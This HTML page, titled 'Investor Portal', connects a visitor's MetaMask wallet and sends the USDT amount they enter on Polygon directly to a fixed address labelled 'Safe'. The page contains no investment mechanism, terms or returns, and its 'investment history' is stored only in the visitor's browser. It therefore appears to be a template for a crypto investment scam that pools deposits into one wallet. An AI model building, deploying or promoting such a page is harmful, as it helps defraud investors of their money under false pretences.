<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Investor Portal</title>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>

<style>
body {
  margin:0;
  background:#0b0f14;
  color:white;
  font-family:Arial;
}

.container {
  max-width:700px;
  margin:auto;
  padding:20px;
  position:relative;
  z-index:10;
}

.card {
  background:#141a22;
  padding:20px;
  border-radius:12px;
  margin-top:20px;
}

button {
  width:100%;
  padding:12px;
  margin-top:10px;
  border:none;
  border-radius:10px;
  background:#00ffae;
  font-weight:bold;
  cursor:pointer;
}

button:disabled {
  background:#555;
}

input {
  width:100%;
  padding:10px;
  margin-top:10px;
  border:none;
  border-radius:8px;
}

.status {
  margin-top:10px;
  font-size:14px;
  color:#aaa;
}
</style>
</head>

<body>

<div class="container">

<h2>🌍 Investor Portal</h2>

<div class="card">
<button id="connectBtn">🔗 Connect Wallet</button>
<div id="wallet"></div>
</div>

<div class="card">
<h3>💰 Invest (USDT - Polygon)</h3>

<input id="amount" placeholder="Enter amount (e.g. 10)">
<button id="investBtn">🚀 Invest Now</button>

<div class="status" id="status"></div>

<p style="font-size:12px;color:#888;">
Safe: 0xC8DF...D4E2
</p>

</div>

<div class="card">
<h3>📊 Investment History</h3>
<div id="history">No records yet</div>
</div>

</div>

<script>

// ===== 强制等待 MetaMask 注入 =====
async function waitForEthereum() {
  return new Promise(resolve => {
    if (window.ethereum) return resolve(window.ethereum);
    window.addEventListener("ethereum#initialized", () => resolve(window.ethereum), { once: true });
    setTimeout(() => resolve(window.ethereum), 3000);
  });
}

// ===== CONFIG =====
const SAFE = "0xC8DF3B516616800b2709F66e1bee7520aBAbD4E2";
const USDT = "0xC2132D05D31c914a87C6611C10748AaCBdA6C623";

const ERC20 = [
  "function transfer(address to, uint256 amount) returns (bool)",
  "function balanceOf(address account) view returns (uint256)"
];

let provider, signer, user;
let isProcessing = false;

// ===== CONNECT WALLET（终极稳定版）=====
async function connectWallet(){

  try {

    const ethereum = await waitForEthereum();

    if(!ethereum){
      alert("MetaMask not detected");
      return;
    }

    const accounts = await ethereum.request({
      method: "eth_requestAccounts"
    });

    user = accounts[0];

    provider = new ethers.providers.Web3Provider(ethereum);
    signer = provider.getSigner();

    document.getElementById("wallet").innerText =
      "Connected: " + user;

  } catch(e){

    console.error("CONNECT ERROR:", e);

    alert("Wallet connection failed:\n" + e.message);
  }
}

// ===== NETWORK =====
async function checkNetwork(){

  const chainId = await window.ethereum.request({
    method: "eth_chainId"
  });

  if(chainId !== "0x89"){
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x89" }]
    });
  }
}

// ===== INVEST =====
async function invest(){

  if(isProcessing) return;
  isProcessing = true;

  const btn = document.getElementById("investBtn");

  try {

    if(!signer){
      alert("Connect wallet first");
      return;
    }

    await checkNetwork();

    let amount = document.getElementById("amount").value;

    if(!amount || amount <= 0){
      alert("Enter valid amount");
      return;
    }

    btn.disabled = true;
    btn.innerText = "Processing...";

    const token = new ethers.Contract(USDT, ERC20, signer);

    let parsed = ethers.utils.parseUnits(amount, 6);

    document.getElementById("status").innerText = "Checking balance...";

    const balance = await token.balanceOf(user);

    if(balance.lt(parsed)){
      alert("Insufficient USDT");
      return;
    }

    document.getElementById("status").innerText = "Confirm in wallet...";

    let tx = await token.transfer(SAFE, parsed);

    document.getElementById("status").innerText = "TX: " + tx.hash;

    await tx.wait();

    document.getElementById("status").innerText = "Success";

    document.getElementById("amount").value = "";

    addHistory(user, amount, tx.hash);

  } catch(e){

    console.error("INVEST ERROR:", e);

    document.getElementById("status").innerText =
      "Error: " + e.message;

  } finally {

    isProcessing = false;
    btn.disabled = false;
    btn.innerText = "🚀 Invest Now";
  }
}

// ===== HISTORY =====
function addHistory(user, amount, hash){

  let history = JSON.parse(localStorage.getItem("investments") || "[]");

  history.push({
    user,
    amount,
    hash,
    time: new Date().toLocaleString()
  });

  localStorage.setItem("investments", JSON.stringify(history));

  renderHistory();
}

function renderHistory(){

  let history = JSON.parse(localStorage.getItem("investments") || "[]");

  if(history.length === 0){
    document.getElementById("history").innerText = "No records yet";
    return;
  }

  document.getElementById("history").innerHTML =
    history.map(h => `
      <div style="margin-bottom:12px;">
        <b>${h.amount} USDT</b><br>
        <small>${h.user.slice(0,6)}...${h.user.slice(-4)}</small><br>
        <a href="https://polygonscan.com/tx/${h.hash}" target="_blank">
          View TX
        </a>
      </div>
    `).join("");
}

// ===== 绑定事件（防 onclick 失效）=====
document.getElementById("connectBtn").addEventListener("click", connectWallet);
document.getElementById("investBtn").addEventListener("click", invest);

// 初始化
renderHistory();

</script>

</body>
</html>
